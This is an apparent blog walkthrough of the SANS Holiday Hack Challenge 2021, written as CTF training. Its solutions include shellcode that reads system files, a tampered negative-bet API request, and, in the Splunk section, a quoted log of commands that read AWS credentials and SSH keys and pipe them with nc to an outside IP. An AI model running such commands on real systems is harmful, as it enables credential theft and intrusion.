@@ -1,0 +1,1195 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Matthias Altmann">
+<meta name="description" content="SANS Holiday Hack Challenge 2021 Writeup / Walkthrough">
+
+<title>SANS Holiday Hack Challenge 2021 Writeup</title>
+
+<!-- Bootstrap core CSS -->
+<link href="/blog/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+<!-- Bootstrap core JavaScript -->
+<script src="/blog/vendor/jquery/jquery.min.js"></script>
+<script src="/blog/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+<!-- Custom fonts for this template -->
+<link href="/blog/vendor/fontawesome-free-web/css/all.css" rel="stylesheet" type="text/css">
+<link href='/blog/vendor/fonts-googleapis/lora.css' rel='stylesheet' type='text/css'>
+<link href='/blog/vendor/fonts-googleapis/opensans.css' rel='stylesheet' type='text/css'>
+
+<link rel="shortcut icon" href="/blog/assets/img/favicon.ico" type="image/x-icon">
+<link rel="icon" href="/blog/assets/img/favicon.ico" type="image/x-icon">
+
+<script src="/blog/vendor/jquery/jquery.min.js"></script>
+<script src="/blog/vendor/gsap/gsap.min.js"></script>
+
+<script src="/blog/vendor/highlight/highlight.pack.js"></script>
+<link href="/blog/vendor/highlight/styles/default.css" rel="stylesheet" type="text/css">
+<script>hljs.initHighlightingOnLoad();</script>
+
+<link href="/blog/vendor/malihu-jquery-custom-scrollbar/jquery.mCustomScrollbar.min.css" rel="stylesheet">
+<script src="/blog/vendor/malihu-jquery-custom-scrollbar/jquery.mCustomScrollbar.js"></script>
+
+<!-- Custom styles and scripts -->
+<link href="/blog/css/clean-blog.min.css" rel="stylesheet">
+<script src="/blog/js/clean-blog.min.js"></script>
+
+<link href="/blog/css/svganimations.css" rel="stylesheet">
+
+<script src="/blog/js/sidebar.js"></script>
+<link href="/blog/css/sidebar.css" rel="stylesheet">
+
+<!-- For atom rss feed that browser can detect rss on side -->
+<link href="/blog/feed.xml" type="application/atom+xml" rel="alternate" title="Sitewide Atom feed" />
+
+
+
+
+
+</head>
+
+<body>
+
+<!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container px-4 px-lg-5">
+        <a class="navbar-brand" id="nav-link-main" href="/blog/index.html">~/sec/f00tprint</a>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+            Menu
+            <i class="fa fa-bars"></i>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+            <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                <li class="nav-item">
+                    <a class="nav-link px-lg-3 py-3 py-lg-4" href="/blog/index.html">Posts</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link px-lg-3 py-3 py-lg-4" href="/blog/germancorner.html">German Corner</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link px-lg-3 py-3 py-lg-4" href="/blog/passwords/onlinecracker/testcontainer/en">Last Post</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link px-lg-3 py-3 py-lg-4" href="/blog/about.html">About</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+
+<!-- Page Header -->
+<header class="masthead" style="background-image:url('/blog/assets/img/post_backgrounds/HolidayHack2020.jpg')">
+    <div class="overlay"></div>
+    <div class="container position-relative px-4 px-lg-5">
+        <div class="row gx-4 gx-lg-5 justify-content-center">
+            <div class="col-md-10 col-lg-8 col-xl-7">
+                <div class="site-heading">
+                    <h1>SANS Holiday Hack Challenge 2021 Writeup</h1>
+                    
+                    <h2 class="subheading">Walkthrough</h2>
+                    
+                    
+                    <span class="meta">Posted on January 7, 2021</span>
+                    
+
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+
+        
+        <nav id="sidebar" class="sidebar-wrapper active">
+            <div class="sidebar-header">
+                <h3>Table of contents</h3>
+                <h4>SANS Holiday Hack Challenge 2021 Writeup</h4>
+            </div>
+
+            <ul class="list-unstyled components">
+                <ul id="toc" class="section-nav">
+<li class="toc-entry toc-h1"><a href="#introduction">Introduction</a></li>
+<li class="toc-entry toc-h1">
+<a href="#objectives">Objectives</a>
+<ul>
+<li class="toc-entry toc-h2">
+<a href="#1---kringle-orientation">1 - Kringle Orientation</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#possible-solution">Possible solution</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2">
+<a href="#2---where-in-the-world-is-caramel-santiago">2 - Where in the world is Caramel Santiago</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#possible-solution-1">Possible solution</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2">
+<a href="#3---thaw-frost-towers-entrance">3 - Thaw Frost Towers Entrance</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#possible-solution-2">Possible solution</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2">
+<a href="#4---slot-machine-investigation">4 - Slot Machine Investigation</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#possible-solution-3">Possible solution</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2">
+<a href="#5---strange-usb-device">5 - Strange USB Device</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#possible-solution-4">Possible solution</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2">
+<a href="#6---shellcode-primer">6 - Shellcode Primer</a>
+<ul>
+<li class="toc-entry toc-h3">
+<a href="#possible-solution-5">Possible solution</a>
+<ul>
+<li class="toc-entry toc-h4"><a href="#level-1">Level 1</a></li>
+<li class="toc-entry toc-h4"><a href="#level-2">Level 2</a></li>
+<li class="toc-entry toc-h4"><a href="#level-3">Level 3</a></li>
+<li class="toc-entry toc-h4"><a href="#level-4">Level 4</a></li>
+<li class="toc-entry toc-h4"><a href="#level-5">Level 5</a></li>
+<li class="toc-entry toc-h4"><a href="#level-6">Level 6</a></li>
+<li class="toc-entry toc-h4"><a href="#level-7">Level 7</a></li>
+<li class="toc-entry toc-h4"><a href="#level-8">Level 8</a></li>
+<li class="toc-entry toc-h4"><a href="#level-9">Level 9</a></li>
+<li class="toc-entry toc-h4"><a href="#level-10">Level 10</a></li>
+<li class="toc-entry toc-h4"><a href="#level-11">Level 11</a></li>
+<li class="toc-entry toc-h4"><a href="#level-11-1">Level 11+</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toc-entry toc-h2">
+<a href="#9---splunk">9 - Splunk</a>
+<ul>
+<li class="toc-entry toc-h3">
+<a href="#possible-solution-6">Possible solution</a>
+<ul>
+<li class="toc-entry toc-h4"><a href="#level-1-1">Level 1</a></li>
+<li class="toc-entry toc-h4"><a href="#level-2-1">Level 2</a></li>
+<li class="toc-entry toc-h4"><a href="#level-3-1">Level 3</a></li>
+<li class="toc-entry toc-h4"><a href="#level-4-1">Level 4</a></li>
+<li class="toc-entry toc-h4"><a href="#level-5-1">Level 5</a></li>
+<li class="toc-entry toc-h4"><a href="#level-6-1">Level 6</a></li>
+<li class="toc-entry toc-h4"><a href="#level-7-1">Level 7</a></li>
+<li class="toc-entry toc-h4"><a href="#level-8-1">Level 8</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toc-entry toc-h1">
+<a href="#achievements">Achievements</a>
+<ul>
+<li class="toc-entry toc-h2"><a href="#logic-munchers">Logic munchers</a></li>
+<li class="toc-entry toc-h2">
+<a href="#greeping-for-gold">Greeping for gold</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#level-1-2">Level 1</a></li>
+<li class="toc-entry toc-h3"><a href="#level-2-2">Level 2</a></li>
+<li class="toc-entry toc-h3"><a href="#level-3-2">Level 3</a></li>
+<li class="toc-entry toc-h3"><a href="#level-4-2">Level 4</a></li>
+<li class="toc-entry toc-h3"><a href="#level-5-2">Level 5</a></li>
+<li class="toc-entry toc-h3"><a href="#level-6-2">Level 6</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#strace-lctrace-retrace">strace lctrace retrace</a></li>
+<li class="toc-entry toc-h2"><a href="#yara-analysis">yara analysis</a></li>
+<li class="toc-entry toc-h2"><a href="#ipv6-sandbox">IPv6 Sandbox</a></li>
+<li class="toc-entry toc-h2">
+<a href="#elf-code-python">Elf code Python</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#level-1-3">Level 1</a></li>
+<li class="toc-entry toc-h3"><a href="#level-2-3">Level 2</a></li>
+<li class="toc-entry toc-h3"><a href="#level-3-3">Level 3</a></li>
+<li class="toc-entry toc-h3"><a href="#level-4-3">Level 4</a></li>
+<li class="toc-entry toc-h3"><a href="#level-5-3">Level 5</a></li>
+<li class="toc-entry toc-h3"><a href="#level-6-3">Level 6</a></li>
+<li class="toc-entry toc-h3"><a href="#level-7-2">Level 7</a></li>
+<li class="toc-entry toc-h3"><a href="#level-8-2">Level 8</a></li>
+<li class="toc-entry toc-h3"><a href="#level-9-1">Level 9</a></li>
+<li class="toc-entry toc-h3"><a href="#level-10-1">Level 10</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#document-analysis-exiftool-metadata">Document Analysis Exiftool Metadata</a></li>
+<li class="toc-entry toc-h2"><a href="#frostavator">Frostavator</a></li>
+<li class="toc-entry toc-h2"><a href="#hoho-no-fail2ban">Hoho No Fail2ban</a></li>
+<li class="toc-entry toc-h2"><a href="#santas-holiday-hero">Santas Holiday Hero</a></li>
+<li class="toc-entry toc-h2"><a href="#bonus-blue-log4jack">Bonus Blue Log4jack</a></li>
+<li class="toc-entry toc-h2"><a href="#bonus-blue-log4jack-1">Bonus Blue Log4jack</a></li>
+</ul>
+</li>
+</ul>
+            </ul>
+
+        </nav>
+        
+
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                
+                <button type="button" id="sidebarCollapse" class="btn btn-primary-sm btn btn-block">
+                    <i class="fas fa-align-left"></i>
+                    <span>Toggle Table of Contents</span>
+                </button>
+                
+                <br>
+                <h1 id="introduction">
+<a class="anchor" href="#introduction" aria-hidden="true"><span class="octicon octicon-link"></span></a>Introduction</h1>
+
+<p>Like every year, many thanks to SANS for this incredible event.</p>
+
+<p>Following the solutions, as far as I got. I’ll add stuff and more detail in my free time.</p>
+
+<h1 id="objectives">
+<a class="anchor" href="#objectives" aria-hidden="true"><span class="octicon octicon-link"></span></a>Objectives</h1>
+
+<h2 id="1---kringle-orientation">
+<a class="anchor" href="#1---kringle-orientation" aria-hidden="true"><span class="octicon octicon-link"></span></a>1 - Kringle Orientation</h2>
+
+<h3 id="possible-solution">
+<a class="anchor" href="#possible-solution" aria-hidden="true"><span class="octicon octicon-link"></span></a>Possible solution</h3>
+
+<p>Go to Jingle Ringford and click on him. Then get your badge and wifi adapter. Then click on the terminal and enter “answer”.</p>
+
+<h2 id="2---where-in-the-world-is-caramel-santiago">
+<a class="anchor" href="#2---where-in-the-world-is-caramel-santiago" aria-hidden="true"><span class="octicon octicon-link"></span></a>2 - Where in the world is Caramel Santiago</h2>
+
+<h3 id="possible-solution-1">
+<a class="anchor" href="#possible-solution-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Possible solution</h3>
+
+<p>Depending on the question, take the next place from the information:</p>
+
+<p>What2words: 3 clearly salient keywords
+Google keywords: e.g. Wikipedia articles like “Vánoĉní trh” and then switch to English or just the letter Í
+MGRS: https://legallandconverter.com/p50.html
+GPS coordinates: https://www.gps-coordinates.net/</p>
+
+<p>and filter the elves according to the information you get about each place.</p>
+
+<h2 id="3---thaw-frost-towers-entrance">
+<a class="anchor" href="#3---thaw-frost-towers-entrance" aria-hidden="true"><span class="octicon octicon-link"></span></a>3 - Thaw Frost Towers Entrance</h2>
+
+<h3 id="possible-solution-2">
+<a class="anchor" href="#possible-solution-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Possible solution</h3>
+
+<p>iwconfig - determine the wifi interface
+iwlist wlan0 scanning - get the essid and encryption
+iwconfig wlan0 essid FROST-Nidus-Setup ap any - connect to access point
+curl http://nidus-setup:8080 - first contact with thermostat page
+curl http://nidus-setup:8080/apidoc - look inside the apidoc
+curl -XPOST -H ‘Content-Type: application/json’ –data-binary ‘{“temperature”:      40}’ http://nidus-setup:8080/api/cooler</p>
+<ul>
+  <li>set the temperature to high so the door melts</li>
+</ul>
+
+<h2 id="4---slot-machine-investigation">
+<a class="anchor" href="#4---slot-machine-investigation" aria-hidden="true"><span class="octicon octicon-link"></span></a>4 - Slot Machine Investigation</h2>
+
+<h3 id="possible-solution-3">
+<a class="anchor" href="#possible-solution-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Possible solution</h3>
+
+<p>Open Firefox network tab and edit an existing request to https://slots.jackfrosttower.com/api/v1/…/spin
+as data set: betamount=10&amp;numline=20&amp;cpl=-0.9
+important is the negative bet size here so you will always win more credits.
+The solution is after multiple times in the json answer in the “response” key.</p>
+
+<h2 id="5---strange-usb-device">
+<a class="anchor" href="#5---strange-usb-device" aria-hidden="true"><span class="octicon octicon-link"></span></a>5 - Strange USB Device</h2>
+
+<h3 id="possible-solution-4">
+<a class="anchor" href="#possible-solution-4" aria-hidden="true"><span class="octicon octicon-link"></span></a>Possible solution</h3>
+
+<p>Use mallard.py in the following way:</p>
+
+<p>./mallard.py -f /mnt/USBDEVICE/inject.bin</p>
+
+<p>Take the base64 and decode the reverse it was encoded</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>echo ‘==…’</td>
+      <td>rev</td>
+      <td>base64 -d</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The output shows a command setting a new connection from ickymcgoop@trollfun.jackfrosttower.com for ssh.
+So ickymcgoop is the solution you can enter in the terminal section above.</p>
+
+<h2 id="6---shellcode-primer">
+<a class="anchor" href="#6---shellcode-primer" aria-hidden="true"><span class="octicon octicon-link"></span></a>6 - Shellcode Primer</h2>
+
+<h3 id="possible-solution-5">
+<a class="anchor" href="#possible-solution-5" aria-hidden="true"><span class="octicon octicon-link"></span></a>Possible solution</h3>
+
+<h4 id="level-1">
+<a class="anchor" href="#level-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 1</h4>
+
+<p>; Set up some registers (sorta like variables) with values
+; In the debugger, look how these change!
+mov rax, 0
+mov rbx, 1
+mov rcx, 2
+mov rdx, 3
+mov rsi, 4
+mov rdi, 5
+mov rbp, 6</p>
+
+<p>; Push and pop - watch how the stack changes!
+push 0x12345678
+pop rax</p>
+
+<p>push 0x1111
+push 0x2222
+push 0x3333
+pop rax
+pop rax
+pop rax</p>
+
+<p>; This creates a string and references it in rax - watch the debugger!
+call getstring
+db “Hello World!”,0
+getstring:
+pop rax</p>
+
+<p>; Finally, return 0x1337
+mov rax, 0x1337
+ret</p>
+
+<h4 id="level-2">
+<a class="anchor" href="#level-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 2</h4>
+
+<p>; We want to loop 5 times - you can change this if you want!
+mov rax, 5</p>
+
+<p>; Top of the loop
+top:
+; Decrement rax
+dec rax</p>
+
+<p>; Jump back to the top until rax is zero
+jnz top</p>
+
+<p>; Cleanly return after the loop
+ret</p>
+
+<h4 id="level-3">
+<a class="anchor" href="#level-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 3</h4>
+
+<p>; This is a comment! We’ll use comments to help guide your journey.
+; Right now, we just need to RETurn!
+;
+; Enter a return statement below and hit Execute to see what happens!
+ret</p>
+
+<h4 id="level-4">
+<a class="anchor" href="#level-4" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 4</h4>
+
+<p>; TODO: Set rax to 1337</p>
+
+<p>; Return, just like we did last time
+mov rax,1337
+ret</p>
+
+<h4 id="level-5">
+<a class="anchor" href="#level-5" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 5</h4>
+
+<p>; TODO: Find the syscall number for sys_exit and put it in rax</p>
+
+<p>; TODO: Put the exit_code we want (99) in rdi</p>
+
+<p>; Perform the actual syscall
+mov rax,60
+; ref https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
+mov rdi,99
+syscall</p>
+
+<h4 id="level-6">
+<a class="anchor" href="#level-6" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 6</h4>
+
+<p>; Push this value to the stack
+push 0x12345678</p>
+
+<p>; Try to return
+ret</p>
+
+<h4 id="level-7">
+<a class="anchor" href="#level-7" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 7</h4>
+
+<p>; Remember, this call pushes the return address to the stack
+call place_below_the_nop</p>
+
+<p>; This is where the function <em>thinks</em> it is supposed to return
+nop</p>
+
+<p>; This is a ‘label’ - as far as the call knows, this is the start of a function
+place_below_the_nop:</p>
+
+<p>; TODO: Pop the top of the stack into rax
+pop rax</p>
+
+<p>; Return from our code, as in previous levels
+ret</p>
+
+<h4 id="level-8">
+<a class="anchor" href="#level-8" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 8</h4>
+
+<p>; This would be a good place for a call
+call label0
+; This is the literal string ‘Hello World’, null terminated, as code. Except
+; it’ll crash if it actually tries to run, so we’d better jump over it!
+db ‘Hello World’,0</p>
+
+<p>; This would be a good place for a label and a pop
+label0:
+pop rax
+; This would be a good place for a re… oh wait, it’s already here. Hooray!
+ret</p>
+
+<h4 id="level-9">
+<a class="anchor" href="#level-9" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 9</h4>
+
+<p>; TODO: Get a reference to this string into the correct register
+call getstring
+db ‘Hello World!’,0
+getstring:
+pop rsi</p>
+
+<p>; Set up a call to sys_write
+; TODO: Set rax to the correct syscall number for sys_write
+mov rax,1</p>
+
+<p>; TODO: Set rdi to the first argument (the file descriptor, 1)
+mov rdi,1</p>
+
+<p>; TODO: Set rsi to the second argument (buf - this is the “Hello World” string)</p>
+
+<p>; TODO: Set rdx to the third argument (length of the string, in bytes)
+mov rdx,0xC</p>
+
+<p>; Perform the syscall
+syscall</p>
+
+<p>; Return cleanly
+ret</p>
+
+<h4 id="level-10">
+<a class="anchor" href="#level-10" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 10</h4>
+
+<p>; TODO: Get a reference to this string into the correct register
+call getstring
+db ‘/etc/passwd’,0
+getstring:
+pop rdi</p>
+
+<p>; Set up a call to sys_open
+; TODO: Set rax to the correct syscall number
+mov rax,2</p>
+
+<p>; TODO: Set rdi to the first argument (the filename)
+; see above</p>
+
+<p>; TODO: Set rsi to the second argument (flags - 0 is fine)
+mov rsi,0</p>
+
+<p>; TODO: Set rdx to the third argument (mode - 0 is also fine)
+mov rdx,0</p>
+
+<p>; Perform the syscall
+syscall</p>
+
+<p>; syscall sets rax to the file handle, so to return the file handle we don’t
+; need to do anything else!
+ret</p>
+
+<h4 id="level-11">
+<a class="anchor" href="#level-11" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 11</h4>
+
+<p>cat 11.asm
+; TODO: Get a reference to this
+call getstring
+db ‘/var/northpolesecrets.txt’,0
+getstring:
+pop rdi</p>
+
+<p>; TODO: Call sys_open
+mov rax,2
+mov rsi,0
+mov rdx,0
+syscall</p>
+
+<p>; TODO: Call sys_read on the file handle and read it into rsp
+mov rdi, rax
+mov rax,0
+mov rsi,rsp
+mov rdx,255
+syscall</p>
+
+<p>; TODO: Call sys_write to write the contents from rsp to stdout (1)
+mov rdx,rax
+mov rax,1
+mov rdi,1
+syscall</p>
+
+<p>; TODO: Call sys_exit
+mov rax,60
+mov rdi,99
+syscall</p>
+
+<h4 id="level-11-1">
+<a class="anchor" href="#level-11-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 11+</h4>
+
+<p>; TODO: Get a reference to this
+call getstring
+db ‘/var/northpolesecrets.txt’,0
+getstring:
+pop rdi</p>
+
+<p>; TODO: Call sys_open
+mov rax,2
+mov rsi,0
+mov rdx,0
+syscall</p>
+
+<p>; TODO: Call sys_read on the file handle and read it into rsp
+mov rdi, rax
+mov rax,0
+sub rsp,0x00000089
+mov rsi,rsp
+mov rdx,255
+syscall</p>
+
+<p>; TODO: Call sys_write to write the contents from rsp to stdout (1)
+mov rdx,rax
+mov rax,1
+mov rdi,1
+syscall</p>
+
+<p>add rsp,0x00000089
+ret</p>
+
+<h2 id="9---splunk">
+<a class="anchor" href="#9---splunk" aria-hidden="true"><span class="octicon octicon-link"></span></a>9 - Splunk</h2>
+
+<h3 id="possible-solution-6">
+<a class="anchor" href="#possible-solution-6" aria-hidden="true"><span class="octicon octicon-link"></span></a>Possible solution</h3>
+
+<h4 id="level-1-1">
+<a class="anchor" href="#level-1-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 1</h4>
+
+<table>
+  <tbody>
+    <tr>
+      <td>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1         user=eddie</td>
+      <td>stats count by CommandLine</td>
+      <td>sort - count</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>from there you can get “git status”</p>
+
+<h4 id="level-2-1">
+<a class="anchor" href="#level-2-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 2</h4>
+
+<p>index=main user=eddie CommandLine=”git remote add*”</p>
+
+<p>delivers</p>
+
+<p>“git remote add origin git@github.com:elfnp3/partnerapi.git”
+“git remote add origin https://github.com/elfnp3/partnerapi.git”</p>
+
+<p>so the solution is “git@github.com:elfnp3/partnerapi.git”</p>
+
+<h4 id="level-3-1">
+<a class="anchor" href="#level-3-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 3</h4>
+
+<p>index=main user=eddie CommandLine=”docker*”</p>
+
+<p>shows</p>
+
+<p>“docker up”</p>
+
+<h4 id="level-4-1">
+<a class="anchor" href="#level-4-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 4</h4>
+
+<table>
+  <tbody>
+    <tr>
+      <td>index=main sourcetype=github_json</td>
+      <td>fields repository.full_name</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>shows</p>
+
+<p>elfnp3/dvws-node    23  85,185 %
+elfnp3/partnerapi   4   14,815 %</p>
+
+<p>googling “github dvws-node” delivers “https://github.com/snoopysecurity/dvws-node”</p>
+
+<h4 id="level-5-1">
+<a class="anchor" href="#level-5-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 5</h4>
+
+<p>index=main user=eddie npm partnerapi</p>
+
+<p>click at “CommandLine”</p>
+
+<p>/usr/bin/env node 
+/usr/bin/npm install holiday-utils-js</p>
+
+<p>So we have “holiday-utils-js”</p>
+
+<h4 id="level-6-1">
+<a class="anchor" href="#level-6-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 6</h4>
+
+<p>Click at the recommended search and then on both IPs. View the Events.
+Choose “process_name” at the left:</p>
+
+<p>192.30.255.113
+=&gt; /usr/bin/git
+54.175.69.219
+=&gt; /usr/bin/nc.openbsd</p>
+
+<p>The answer is “/usr/bin/nc.openbsd”</p>
+
+<h4 id="level-7-1">
+<a class="anchor" href="#level-7-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 7</h4>
+
+<p>Use the process_id from the last query at the the left side and put it into:</p>
+
+<p>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 process_id=6791</p>
+
+<p>Click “parent_process” in the left, this changes the query to:</p>
+
+<p>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 parent_process_id=6788</p>
+
+<p>Click “CommandLine”:</p>
+
+<p>cat /home/eddie/.aws/credentials /home/eddie/.ssh/authorized_keys /home/eddie/.ssh/config /home/eddie/.ssh/eddie /home/eddie/.ssh/eddie.pub /home/eddie/.ssh/known_hosts    1   50 %
+nc -q1 54.175.69.219 16842 1 50 %</p>
+
+<p>From that we can deduce</p>
+
+<p>/home/eddie/.aws/credentials
+/home/eddie/.ssh/authorized_keys
+/home/eddie/.ssh/config
+/home/eddie/.ssh/eddie
+/home/eddie/.ssh/eddie.pub
+/home/eddie/.ssh/known_hosts</p>
+
+<p>=&gt; 6 files</p>
+
+<h4 id="level-8-1">
+<a class="anchor" href="#level-8-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 8</h4>
+
+<p>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1         CommandLine=”*.sh”</p>
+
+<p>“CommandLine” shows only one script:</p>
+
+<p>/bin/sh -c /bin/bash preinstall.sh</p>
+
+<p>so it is: “preinstall.sh”</p>
+
+<p>If you look at the top of the to-do list you can see</p>
+
+<p>“Thank you for helping Santa complete his investigation! Santa says you’re a whiz”</p>
+
+<p>“whiz” is the solution for the Splunk challenge.</p>
+
+<h1 id="achievements">
+<a class="anchor" href="#achievements" aria-hidden="true"><span class="octicon octicon-link"></span></a>Achievements</h1>
+
+<h2 id="logic-munchers">
+<a class="anchor" href="#logic-munchers" aria-hidden="true"><span class="octicon octicon-link"></span></a>Logic munchers</h2>
+
+<p>Understand the boolean logic and play the mentioned level</p>
+
+<h2 id="greeping-for-gold">
+<a class="anchor" href="#greeping-for-gold" aria-hidden="true"><span class="octicon octicon-link"></span></a>Greeping for gold</h2>
+
+<h3 id="level-1-2">
+<a class="anchor" href="#level-1-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 1</h3>
+
+<p>grep ‘34.76.1.22’ bigscan.gnmap
+Host: 34.76.1.22 ()     Status: Up
+Host: 34.76.1.22 ()     Ports: 62078/open/tcp//iphone-sync///      Ignored State: closed (999)
+=&gt; 62078</p>
+
+<h3 id="level-2-2">
+<a class="anchor" href="#level-2-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 2</h3>
+
+<p>grep ‘34.77.207.226’ bigscan.gnmap
+Host: 34.77.207.226 ()     Status: Up
+Host: 34.77.207.226 ()     Ports: 8080/open/tcp//http-proxy///      Ignored State: filtered (999)</p>
+
+<p>=&gt; 8080</p>
+
+<h3 id="level-3-2">
+<a class="anchor" href="#level-3-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 3</h3>
+
+<p>grep ‘Up’ bigscan.gnmap | wc -l
+26054</p>
+
+<p>=&gt; 26054</p>
+
+<h3 id="level-4-2">
+<a class="anchor" href="#level-4-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 4</h3>
+
+<p>grep -E ‘(\s80|\s443|\s8080)\/open’ bigscan.gnmap | wc -l
+14372</p>
+
+<p>=&gt; 14372</p>
+
+<h3 id="level-5-2">
+<a class="anchor" href="#level-5-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 5</h3>
+
+<p>echo $((<code class="language-plaintext highlighter-rouge">grep 'Up' -A 1 bigscan.gnmap | grep Up | wc -l</code> - <code class="language-plaintext highlighter-rouge">grep 'Up' -A 1 bigscan.gnmap | grep Port |  wc -l</code>))
+402</p>
+
+<p>=&gt; 402</p>
+
+<h3 id="level-6-2">
+<a class="anchor" href="#level-6-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 6</h3>
+
+<table>
+  <tbody>
+    <tr>
+      <td>while read p; do out1=$(echo $p</td>
+      <td>cut -f 2 -d “ “);out2=$(echo -n $p</td>
+      <td>grep -o “open”</td>
+      <td>wc -l); echo “$out1  $out2”; done &lt; &lt;(grep “Ports” bigscan.gnmap) &gt; ot</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>sort -k2 -n ot | tail
+34.79.226.71 11
+34.79.238.251 11
+34.79.251.175 11
+34.79.45.15 11
+34.79.74.77 11
+34.76.237.4 12
+34.77.152.226 12
+34.78.10.40 12
+34.79.22.38 12
+34.79.94.34 12</p>
+
+<p>=&gt; 12</p>
+
+<h2 id="strace-lctrace-retrace">
+<a class="anchor" href="#strace-lctrace-retrace" aria-hidden="true"><span class="octicon octicon-link"></span></a>strace lctrace retrace</h2>
+
+<p>ls -&gt; file: “make the candy”
+./make the candy -&gt; Unable to open configuration file
+ltrace ./make the candy -&gt; fopen(“registration.json”,”r”)
+echo ‘{“a:”b”}’ &gt; registration.json
+ltrace ./make the candy -&gt; strstr(“{“a”:”b”}\n”, “Registration”)
+echo ‘{“Registration”:”b”}’ &gt; registration.json
+ltrace ./make the candy -&gt; strstr(“:”b”}\n”,”True”)
+echo ‘{“Registration”:”True”}’ &gt; registration.json</p>
+
+<h2 id="yara-analysis">
+<a class="anchor" href="#yara-analysis" aria-hidden="true"><span class="octicon octicon-link"></span></a>yara analysis</h2>
+
+<p>Run the program “the_critical_elf_app” and look at the output: “yara_rule_135 ./the_critical_elf_app”
+yara_rule_135 has the condition “candycane” in the yara_rules folder.
+So change this string using vim in the binary
+Next rule looks for hex at the end of the string “This is critical for the execution of this program!!”. 
+Replace this too in the binary using vim.
+The rule 1732 has an and condition including the filesize. So cat the file as often together until it is larger than 50 KB.
+If the binary doesnt work after that, change the before mentioned values in all findings in the file.</p>
+
+<h2 id="ipv6-sandbox">
+<a class="anchor" href="#ipv6-sandbox" aria-hidden="true"><span class="octicon octicon-link"></span></a>IPv6 Sandbox</h2>
+
+<p>First check normal IPv4 stuff:</p>
+
+<p>ip neigh -&gt; get arp and ndp  findings -&gt; 192.168.160.1, fe80::1, fe80::42:c0ff:fea8:a002
+nmap 192.168.160.1 -p- -&gt; 22,3000,8000 open
+ping IPv6 
+-&gt; ping6 ff02::1 -c2
+-&gt; ping6 ff02::2 -c2 
+nmap at the IPv6 addresses:
+-&gt; nmap -6 fe80::42::c0ff:fea8:a002%eth0 -p- -&gt; 80,9000 open
+curl:
+-&gt; curl –interface eth0 http://[fe80::42::c0ff:fea8:a002]:80/ says 
+“Connect to the other open TCP port to get the striper’s activation phrase”
